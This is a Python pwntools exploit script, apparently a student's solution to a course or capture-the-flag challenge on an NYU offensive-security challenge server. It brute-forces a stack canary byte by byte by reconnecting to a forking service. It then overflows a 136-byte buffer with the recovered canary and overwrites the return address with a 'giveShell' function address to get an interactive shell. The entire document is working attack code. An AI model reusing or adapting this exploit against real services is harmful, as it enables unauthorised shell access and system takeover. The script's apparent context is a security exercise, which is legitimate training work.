import sys
from pwn import *

giveShell = p64(0x400afd)
print(giveShell)

#Canary is the bytes of stack canary
canary = ""
#size of buf
offset = 136
#buf that will be sent
buf = "A" * offset

#0x88 bytes buffer then null, hello friend and goodbye

while len(canary) < 9:
    #break into actual shell once canary obtained
    toReq = str(offset + len(canary)+1)
    print(toReq)
    if len(canary) == 8:
        print("done guessing canary")
        p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1340)
        p.recvuntil(":")
        p.sendline("joe215")
        p.recvuntil("?")
        p.sendline("160")
        print(p.recvuntil("data"))
        #buffer with canary + 8 bytes to cover RBP, and giveShell p64 to modify rip
        p.sendline(buf + "A" * 8 + giveShell)
        p.interactive()
    print("guessing canary at index", len(canary))
    #looping 0x00 to 0xff
    for i in range(0, 256):
        #fork success, indicating correct
        p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1340)
        p.recvuntil(":")
        p.sendline("joe215")
        p.recvuntil("?")
        p.sendline(toReq)
        p.recvuntil("data")
        p.sendline(buf + chr(i))
        try:
            p.recvuntil("goodbye!")
            p.close()
            print("Guess correct byte:", hex(i))
            canary += chr(i)
            buf += chr(i)
            break
        except:
            p.close()
            continue

        #fork failure, indicating false
